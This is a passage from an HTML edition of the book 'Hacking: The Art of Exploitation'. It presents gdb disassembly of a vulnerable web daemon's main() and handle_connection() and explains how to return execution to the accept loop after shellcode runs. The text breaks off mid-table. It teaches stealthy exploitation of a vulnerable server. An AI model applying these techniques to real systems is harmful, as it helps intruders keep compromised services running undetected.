<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x652  Putting Things Back Together Again</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part140.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part142.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark128">0x652  Putting Things Back Together Again</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">To put things back together again, we just need to repair any collateral damage caused by the overwrite and/or shellcode, and then jump execution back into the connection accepting loop in <span class="s31">main()</span>. The disassembly of <span class="s31">main() </span>in the output below shows that we can safely return to the addresses <span class="s31">0x08048f64</span>, <span class="s31">0x08048f65</span>, or <span class="s31">0x08048fb7 </span>to get back into the connection accept loop.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1039.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) disass main</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function main:</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048d93</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+0&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">push</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048d94</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+1&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ebp,esp</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048d96</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+3&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">sub</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">esp,0x68</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048d99</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+6&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">and</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,0xfffffff0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048d9c</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+9&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,0x0</p></td></tr><tr style="height:16pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048da1</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+14&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">sub</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">esp,eax</p></td></tr><tr style="height:21pt"><td style="width:47pt"><p class="s42" style="padding-top: 5pt;text-indent: 0pt;text-align: center;">.:[ output</p></td><td style="width:53pt"><p class="s42" style="padding-top: 5pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">trimmed ]:.</p></td><td style="width:28pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:115pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:16pt"><td style="width:47pt"><p class="s42" style="padding-top: 4pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f4b</p></td><td style="width:53pt"><p class="s42" style="padding-top: 4pt;padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+440&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-top: 4pt;padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f4e</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+443&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 10pt;text-align: center;">call</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048860 &lt;listen@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f53</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+448&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">cmp</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,0xffffffff</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f56</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+451&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">jne</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048f64 &lt;main+465&gt;</p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f58</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+453&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:115pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],0x804961a</p></td></tr></table><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:31pt"><td style="width:47pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048f5f</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">0x08048f64</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048f65</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+460&gt;:</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">&lt;main+465&gt;:</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+466&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p><p class="s45" style="padding-left: 4pt;text-indent: 0pt;text-align: left;">nop</p><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048ac4 &lt;fatal&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [ebp-60],0x10</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f6c</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+473&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">lea</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,[ebp-60]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f6f</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+476&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp+8],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f73</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+480&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">lea</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,[ebp-56]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f76</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+483&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f7a</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+487&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,ds:0x804a970</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f7f</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+492&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f82</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+495&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">call</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x80488d0 &lt;accept@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f87</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+500&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [ebp-12],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f8a</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+503&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">cmp</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [ebp-12],0xffffffff</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f8e</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+507&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">jne</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048f9c &lt;main+521&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048f90</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+509&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],0x804962e</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f97</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+516&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 10pt;text-align: center;">call</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048ac4 &lt;fatal&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048f9c</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+521&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,ds:0x804a96c</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fa1</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+526&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp+8],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fa5</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+530&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">lea</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,[ebp-56]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fa8</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+533&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fac</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&lt;main+537&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,DWORD PTR [ebp-12]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048faf</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+540&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fb2</p></td><td style="width:53pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+543&gt;:</p></td><td style="width:28pt"><p class="s42" style="padding-left: 2pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">call</p></td><td style="width:132pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048fb9 &lt;handle_connection&gt;</p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fb7</p></td><td style="width:53pt"><p class="s45" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">&lt;main+548&gt;:</p></td><td style="width:28pt"><p class="s45" style="padding-left: 2pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">jmp</p></td><td style="width:132pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048f65 &lt;main+466&gt;</p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">End of assembler dump. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1040.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">All three of these addresses basically go to the same place. Let’s use <span class="s31">0x08048fb7 </span>since this is the original return address used for the call to <span class="s31">handle_connection()</span>. However, there are other things we need to fix first.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">Look at the function prologue and epilogue for <span class="s31">handle_connection()</span>. These are the instructions that set up and remove the stack frame structures on the stack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1041.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) disass handle_connection</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function handle_connection:</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:42pt"><td style="width:47pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048fb9</p><p class="s45" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">0x08048fba 0x08048fbc 0x08048fbd</p></td><td style="width:115pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+0&gt;:</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">&lt;handle_connection+1&gt;:</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">&lt;handle_connection+3&gt;:</p><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;handle_connection+4&gt;:</p></td><td style="width:36pt"><p class="s45" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">push</p><p class="s45" style="padding-left: 10pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mov push sub</p></td><td style="width:113pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p><p class="s45" style="padding-left: 4pt;padding-right: 65pt;text-indent: 0pt;line-height: 11pt;text-align: left;">ebp,esp ebx esp,0x644</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fc3</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+10&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">lea</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,[ebp-0x218]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fc9</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;handle_connection+16&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fcd</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;handle_connection+20&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,DWORD PTR [ebp+8]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fd0</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+23&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fd3</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+26&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048cb0 &lt;recv_line&gt;</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fd8</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;handle_connection+31&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [ebp-0x620],eax</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fde</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;handle_connection+37&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eax,DWORD PTR [ebp+12]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fe1</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+40&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">movzx</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,WORD PTR [eax+2]</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">0x08048fe5</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+44&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:16pt"><td style="width:47pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0x08048fe8</p></td><td style="width:115pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;handle_connection+47&gt;:</p></td><td style="width:36pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">call</p></td><td style="width:113pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x80488f0 &lt;ntohs@plt&gt;</p></td></tr><tr style="height:37pt"><td style="width:47pt"><p class="s42" style="padding-top: 5pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">.:[ output</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08049302</p></td><td style="width:115pt"><p class="s42" 